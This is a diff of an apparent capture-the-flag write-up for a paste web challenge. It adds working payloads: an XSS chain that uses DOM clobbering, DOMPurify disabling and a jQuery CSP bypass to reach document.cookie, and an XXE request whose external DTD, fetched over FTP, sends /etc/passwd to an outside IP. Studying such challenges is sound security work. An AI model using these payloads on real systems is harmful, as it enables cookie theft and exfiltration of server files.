@@ -4,25 +4,47 @@
 
 ### Payload
 
-Create a paste with the following payload:
+Create a paste with the following title:
 ```
-<form id="fb"><input name="ownerDocument"/><script>alert(document.cookie);</script></form>
+<iframe id="ps"></iframe><script>
+```
+and the following content:
+```
+a<form id="fb"><input name="ownerDocument"/><script>alert(document.cookie);</script></form>
 ```
 
-Then access the paste with:
-```
-http://127.0.0.1/paste/b4ceb9cf-f601-44b1-bbaf-b3aa78a3206d?w=%3Cscript%20src=%22https://cdnjs.cloudflare.com/ajax/libs/dompurify/1.0.11/purify.min.js%22
-```
+and access it.
 
 ### Idea
-1. Abuse Chrome's XSS Auditor (filter-mode) to disable DOMPurify
-2. Bug in paste.html js -> try catch doesn't halt execution
-3. DOM Clobbering -> create element with same DOM Element ID to mess up with js queryselector
-4. jQuery Script Gadget to bypass CSP Strict-Dynamic (https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)
+1. unfiltered output at title, recreate unsandboxed iframe with same DOM ID (`ps`)
+2. `<script>` has highest priority in HTML, use `<script>` to disable DOMPurify
+3. Bug in paste.html js -> try catch doesn't halt execution
+4. Create element with same DOM Element ID `fb` to mess up with js queryselector
+5. jQuery Script Gadget to bypass CSP Strict-Dynamic (https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf) (https://github.com/jquery/jquery/blob/30e1bfbdcb0ff658f1fa128b72480194e8ecb926/src/manipulation.js#L103)
 
 ## Bug 2: XXE (easy)
 
 ### Payload
+
+```
+POST https://pasteweb.corp.geegle.org/api/bugreport/csp
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "ftp://157.230.213.14/ev2.xml">
+%sp;
+]>
+<test></test>
+```
+
+```
+ftp://157.230.213.14/ev2.xml
+
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://157.230.213.14/?%data;'>">
+%param1;
+```
 
 ### Idea
 XXE, use FTP to bypass HTTP(s) filters
